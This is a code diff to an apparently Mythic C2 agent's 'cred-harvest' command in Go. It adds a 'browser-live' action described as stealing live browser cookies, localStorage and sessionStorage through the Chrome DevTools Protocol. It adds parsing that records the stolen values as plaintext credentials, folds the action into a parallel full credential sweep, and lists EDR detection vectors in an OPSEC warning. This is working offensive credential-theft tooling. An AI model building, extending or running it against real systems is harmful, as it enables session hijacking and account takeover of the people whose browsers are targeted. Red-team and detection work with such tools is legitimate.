@@ -17,9 +17,9 @@ func init() {
 			Author:     "@galoryber",
 		},
 		Description:         "Harvest credentials from system files, cloud configs, application secrets, shell history, Windows sources, and M365 OAuth tokens",
-		HelpString:          "cred-harvest -action <shadow|cloud|configs|history|windows|m365-tokens|all> [-user <filter>]\nLinux/macOS: shadow, cloud, configs, history, all\nWindows: cloud, configs, windows, m365-tokens, history, all\nhistory: Scan shell history files for leaked passwords, tokens, and API keys\nm365-tokens: Extract OAuth/JWT tokens from TokenBroker, Teams, and Outlook",
+		HelpString:          "cred-harvest -action <shadow|cloud|configs|history|windows|m365-tokens|browser-live|all> [-user <filter>]\nLinux/macOS: shadow, cloud, configs, history, browser-live, all\nWindows: cloud, configs, windows, m365-tokens, history, browser-live, all\nhistory: Scan shell history files for leaked passwords, tokens, and API keys\nm365-tokens: Extract OAuth/JWT tokens from TokenBroker, Teams, and Outlook\nbrowser-live: Steal live cookies, localStorage, sessionStorage via Chrome DevTools Protocol (CDP)",
 		Version:             4,
-		MitreAttackMappings: []string{"T1552.001", "T1552.003", "T1552.004", "T1003.008", "T1528"},
+		MitreAttackMappings: []string{"T1552.001", "T1552.003", "T1552.004", "T1003.008", "T1528", "T1539"},
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -34,8 +34,8 @@ func init() {
 				Name:             "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). all: run all platform-appropriate actions. dump-all: automated chain — runs hashdump + lsa-secrets + cred-harvest all in parallel via subtasks (Windows).",
-				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens", "dump-all", "full-sweep"},
+				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). browser-live: steal live cookies, localStorage, sessionStorage via Chrome DevTools Protocol (CDP). all: run all platform-appropriate actions. dump-all: automated chain — runs hashdump + lsa-secrets + cred-harvest all in parallel via subtasks (Windows).",
+				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens", "browser-live", "dump-all", "full-sweep"},
 				DefaultValue:     "all",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
@@ -104,6 +104,58 @@ func init() {
 				}
 			}
 
+			// Parse browser-live CDP output: auth cookies and storage entries
+			if strings.Contains(responseText, "Browser Live Session Theft (CDP)") {
+				for _, line := range strings.Split(responseText, "\n") {
+					trimmed := strings.TrimSpace(line)
+					// Parse auth cookies: [AUTH] .domain.com: name = value (flags)
+					if strings.HasPrefix(trimmed, "[AUTH]") {
+						parts := strings.SplitN(trimmed[7:], ":", 2)
+						if len(parts) == 2 {
+							domain := strings.TrimSpace(parts[0])
+							rest := strings.TrimSpace(parts[1])
+							eqIdx := strings.Index(rest, " = ")
+							if eqIdx > 0 {
+								cookieName := strings.TrimSpace(rest[:eqIdx])
+								cookieVal := rest[eqIdx+3:]
+								// Trim flags suffix
+								if parenIdx := strings.LastIndex(cookieVal, " ("); parenIdx > 0 {
+									cookieVal = cookieVal[:parenIdx]
+								}
+								creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+									CredentialType: "plaintext",
+									Realm:          strings.TrimPrefix(domain, "."),
+									Account:        cookieName,
+									Credential:     cookieVal,
+									Comment:        "cred-harvest browser-live (cookie)",
+								})
+							}
+						}
+					}
+					// Parse localStorage/sessionStorage: [LS] key = value or [SS] key = value
+					if strings.HasPrefix(trimmed, "[LS]") || strings.HasPrefix(trimmed, "[SS]") {
+						prefix := trimmed[:4]
+						rest := strings.TrimSpace(trimmed[4:])
+						eqIdx := strings.Index(rest, " = ")
+						if eqIdx > 0 {
+							key := strings.TrimSpace(rest[:eqIdx])
+							val := rest[eqIdx+3:]
+							source := "localStorage"
+							if prefix == "[SS]" {
+								source = "sessionStorage"
+							}
+							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+								CredentialType: "plaintext",
+								Realm:          hostname,
+								Account:        key,
+								Credential:     val,
+								Comment:        fmt.Sprintf("cred-harvest browser-live (%s)", source),
+							})
+						}
+					}
+				}
+			}
+
 			// Parse sensitive env vars: lines like VARIABLE=value under "Sensitive Environment Variables"
 			if strings.Contains(responseText, "Sensitive Environment Variables") {
 				inEnvSection := false
@@ -141,7 +193,9 @@ func init() {
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
 			msg := fmt.Sprintf("OPSEC WARNING: Credential harvesting (action: %s). Accesses system files, cloud configs, shell history, and application secrets. File access patterns may trigger EDR behavioral alerts (T1552.001, T1552.003, T1552.004).", action)
-			if action == "dump-all" {
+			if action == "browser-live" {
+				msg = "OPSEC WARNING: Browser Live Session Theft connects to Chrome/Edge via Chrome DevTools Protocol (CDP) on localhost debug ports. Detection vectors: (1) DevToolsActivePort file access in browser user data dirs, (2) TCP connections to localhost debug ports (9222-9229), (3) WebSocket upgrade requests to /devtools/ paths, (4) Network.getAllCookies and Runtime.evaluate CDP commands logged by browser internals. EDR products (CrowdStrike, SentinelOne) may flag debug port probing and CDP WebSocket connections as suspicious browser manipulation (T1539, T1555.003)."
+			} else if action == "dump-all" {
 				msg = "OPSEC WARNING: Credential Harvest Chain will execute hashdump + lsa-secrets + cred-harvest simultaneously. This triggers SAM/LSA access (requires SYSTEM), reads shadow hashes, cloud configs, and shell history. Combined footprint: memory access to LSASS/SAM, file reads across user profiles, and DPAPI decryption. High detection risk from multiple credential access techniques in rapid succession (T1003.002, T1003.004, T1003.005, T1552)."
 			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
@@ -211,6 +265,7 @@ func init() {
 
 				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
 					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
+					{CommandName: "cred-harvest", Params: `{"action":"browser-live"}`},
 					{CommandName: "browser", Params: `{"action":"passwords"}`},
 					{CommandName: "dpapi", Params: `{"action":"masterkeys"}`},
 					{CommandName: "ssh-keys", Params: `{"action":"enumerate"}`},
@@ -241,7 +296,7 @@ func init() {
 				}
 
 				createArtifact(taskData.Task.ID, "Subtask Chain",
-					"Full Credential Sweep: cred-harvest + browser + dpapi + ssh-keys + keychain (parallel)")
+					"Full Credential Sweep: cred-harvest + browser-live + browser + dpapi + ssh-keys + keychain (parallel)")
 				return response
 			}
 
@@ -251,6 +306,10 @@ func init() {
 			}
 			response.DisplayParams = &displayParams
 
+			if action == "browser-live" {
+				createArtifact(taskData.Task.ID, "Network Connection", "CDP WebSocket connection to localhost debug port (Chrome DevTools Protocol)")
+				createArtifact(taskData.Task.ID, "File Read", "DevToolsActivePort (browser user data directory)")
+			}
 			if action == "shadow" || action == "all" {
 				createArtifact(taskData.Task.ID, "File Read", "/etc/shadow")
 			}
